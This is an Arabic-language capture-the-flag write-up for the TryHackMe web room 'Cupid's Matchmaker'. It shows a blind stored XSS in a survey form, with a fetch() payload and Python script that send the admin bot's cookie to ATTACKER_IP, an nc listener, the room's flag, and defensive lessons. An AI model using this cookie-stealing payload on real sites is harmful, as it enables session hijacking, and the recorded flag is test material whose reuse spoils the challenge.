# Cupid's Matchmaker — TryHackMe

> **الحالة:** اكتملت الغرفة رسمياً بعد قبول العلم. ظهرت صفحة التهنئة بعبارة `Room completed!`، مع إظهار مهمة مكتملة واحدة و`100` نقطة. لم يتم إرسال تقييم الغرفة أو الضغط على **Submit now**.

## بطاقة الغرفة

| الحقل | القيمة |
|---|---|
| الرابط الرسمي | [TryHackMe — Cupid's Matchmaker][1] |
| الاسم الداخلي للمهمة | Cupids Matchmaker |
| الفعالية | Love at First Breach 2026 |
| التصنيف | Web |
| الصعوبة | Easy |
| المدة | 60 دقيقة |
| عدد الأسئلة | 1 |
| الهدف | استغلال نموذج الاستبيان للوصول إلى علم حساب المراجع الإداري |
| بيئة التنفيذ | Lab machine وAttackBox داخل TryHackMe |

## الملخص التنفيذي

تقدم الغرفة خدمة مواعدة تدّعي أن فريقاً من البشر يراجع كل استبيان شخصية يرسله المستخدم. هذه العبارة هي الدليل الأهم في السيناريو: البيانات لا تُحفظ فقط، بل يزورها طرف آخر يمتلك صلاحيات مختلفة. يكشف الاستطلاع أن التطبيق مبني على Flask/Werkzeug ويحتوي على نموذج `/survey`، وأن حقول الإدخال تُخزّن ثم تُعرض من دون تعقيم كافٍ.[1] [2]

تؤدي هذه البنية إلى **Stored XSS** من النوع الأعمى. عند إرسال JavaScript داخل أحد حقول الاستبيان، يحفظه التطبيق، ثم يفتحه HeadlessChrome الذي يحاكي موظف المراجعة. ينفذ المتصفح الحمولة في أصل التطبيق نفسه، فتتمكن من قراءة cookie المراجع وإرسالها إلى listener يسيطر عليه المختبر. تحتوي cookie على العلم، وهو: `THM{XSS_CuP1d_Str1k3s_Ag41n}`.[2] [3]

## مسار الحل

### 1. تحديد الخدمة والمسارات

بعد تشغيل Lab machine، يُفتح التطبيق على العنوان الذي تعرضه TryHackMe والمنفذ `5000`:

```text
http://MACHINE_IP:5000/
```

يمكن تأكيد نوع الخدمة ورؤوسها من داخل المختبر:

```bash
curl -sI http://MACHINE_IP:5000/
```

تظهر مؤشرات إلى Werkzeug/Python، كما تكشف عملية الاستطلاع المسارات الأساسية التالية:[2] [3]

| المسار | الوظيفة |
|---|---|
| `/` | الصفحة الرئيسية |
| `/survey` | نموذج استبيان الشخصية، ويدعم `GET` و`POST` |
| `/login` | صفحة دخول المراجع الإداري |
| `/admin` | لوحة إدارية تتطلب المصادقة |

### 2. فهم دلالة المراجع البشري

يحتوي وصف التطبيق على عبارات متكررة مثل أن فريق المطابقة يراجع كل إرسال وأن المراجعة تتم خلال وقت قصير. في تحديات الويب، يشير ذلك إلى وجود bot أو admin يفتح المحتوى المخزّن تلقائياً. إذا عُرضت قيم المستخدم خاماً داخل صفحة المراجع، فإن JavaScript المضمّن في تلك القيم سينفذ في سياق المتصفح ذي الصلاحيات الأعلى.[2] [3]

يقبل النموذج حقولاً نصية متعددة يمكن اختبارها داخل نطاق الغرفة، منها `name` و`ideal_date` و`describe_yourself` و`looking_for` و`dealbreakers`، إضافة إلى حقول الاختيارات مثل `gender` و`seeking`. لا يظهر النص المرسل مباشرة في صفحة المستخدم بعد الإرسال، لذلك يكون المسار **stored** و**blind** بدلاً من reflected XSS.[3]

### 3. تجهيز listener لاستقبال الأثر

يُشغّل listener داخل AttackBox على منفذ تختاره بيئة المختبر:

```bash
nc -lvnp 8888
```

لا يُستخدم عنوان ثابت من مراجع خارجية؛ يستبدل `ATTACKER_IP` بعنوان AttackBox الحالي داخل جلسة TryHackMe. يظل الاختبار محصوراً في عنوان Lab machine والغرض المعلن للغرفة.

### 4. بناء حمولة Stored XSS

تُستخدم حمولة بسيطة ترسل cookie المراجع إلى listener عند فتح صفحة الاستبيان. مثال الحمولة:

```html
<script>
fetch("http://ATTACKER_IP:8888/?c=" + document.cookie)
</script>
```

يمكن إرسالها عبر طلب `POST` إلى `/survey`. المثال التالي يوضح البنية العامة، مع إبقاء الحقول الأخرى بقيم عادية:

```python
import requests

TARGET = "http://MACHINE_IP:5000"
LHOST = "ATTACKER_IP"

xss = f'<script>fetch("http://{LHOST}:8888/?c="+document.cookie)</script>'

data = {
    "name": xss,
    "age": "25",
    "gender": "Male",
    "seeking": "Female",
    "ideal_date": xss,
    "describe_yourself": xss,
    "looking_for": xss,
    "dealbreakers": xss,
}

response = requests.post(f"{TARGET}/survey", data=data)
print(response.status_code)
```

يعيد التطبيق رسالة تفيد بأن فريق المطابقة سيراجع الطلب قريباً. هذه الاستجابة لا تعني أن الحمولة نُفذت في متصفح المستخدم؛ فهي تعني أن البيانات قُبلت وحُفظت، وأن الخطوة التالية هي انتظار المراجع الآلي.[3]

### 5. انتظار HeadlessChrome وقراءة الأثر

بعد فترة قصيرة، يزور HeadlessChrome الإرسال المخزّن. تصل إلى listener مطالبة من الخادم، ويظهر في `User-Agent` ما يثبت أن الزائر متصفح آلي. تعمل الحمولة في أصل التطبيق نفسه، ولذلك تقرأ `document.cookie` الخاص بالمراجع بدلاً من cookie المستخدم العادي.[2]

يظهر الأثر بصيغة URL-encoded تشبه:

```text
GET /?c=flag=THM%7BXSS_CuP1d_Str1k3s_Ag41n%7D HTTP/1.1
User-Agent: HeadlessChrome/...
```

بعد URL decoding لقيمة `c` يظهر العلم:

```text
THM{XSS_CuP1d_Str1k3s_Ag41n}
```

لا يلزم الوصول المباشر إلى لوحة الإدارة؛ فالهدف هو الاستفادة من مراجعة المحتوى المخزّن داخل سياق المراجع واستخراج القيمة الموجودة في cookie.[2] [3]

## الإجابات النهائية

| السؤال | الإجابة المقبولة |
|---|---|
| What is the flag? | `THM{XSS_CuP1d_Str1k3s_Ag41n}` |

## التحقق الرسمي داخل TryHackMe

تم إدخال العلم `THM{XSS_CuP1d_Str1k3s_Ag41n}` في حقل السؤال الرسمي ثم الضغط على **Check**. ظهرت عبارة **Correct Answer**، وانتقلت المنصة إلى صفحة التهنئة التي عرضت نص **Great work 9gkc! Room completed!**، مع `Completed tasks: 1` و`Points earned: 100`.

لم يتم اختيار درجة تقييم، ولم يتم إرسال تقييم الغرفة أو الضغط على **Submit now**.

## الدروس الأمنية

توضح الغرفة أن أي محتوى يرسله المستخدم ثم يراجعه موظف أو bot هو سطح هجوم محتمل لـ stored XSS. يجب تعقيم كل حقل قبل التخزين أو العرض، والاعتماد على HTML escaping وauto-escaping في محرك القوالب، مع منع استخدام مخرجات خام مثل `|safe` إلا بعد مراجعة دقيقة.[4]

كما يجب ضبط cookie الحساسة بالخاصيتين `HttpOnly` و`Secure`، إضافة إلى `SameSite` المناسب. تمنع `HttpOnly` JavaScript من قراءة cookie عبر `document.cookie`، فتقلل أثر XSS حتى لو فشل أحد مسارات التعقيم.[4]

لا يكفي الاعتماد على التعقيم وحده؛ ينبغي تطبيق سياسة أمن محتوى CSP صارمة تمنع inline scripts وتحد من وجهات `fetch` وXHR، وتشغيل bot المراجع في سياق معزول وبأقل صلاحيات ممكنة. كما يجب تسجيل ومراقبة الزيارات الآلية والإرسالات التي تحتوي على وسوم أو event handlers غير متوقعة.[4]

## المراجع

[1]: https://tryhackme.com/room/lafb2026e3 "TryHackMe — Cupid's Matchmaker"
[2]: https://harry-smith.uk/writeups/tryhackme/cupids-matchmaker/ "TryHackMe — Cupid's Matchmaker | Harry Smith"
[3]: https://www.sh1v4ng.in/writeups/tryhackme/cupids-matchmaker "Cupid's Matchmaker — Stored XSS to Admin Bot Flag Theft"
[4]: https://owasp.org/www-community/attacks/xss/ "OWASP — Cross Site Scripting (XSS)"

<!-- لا يتم إرسال تقييم الغرفة ضمن سير العمل. -->
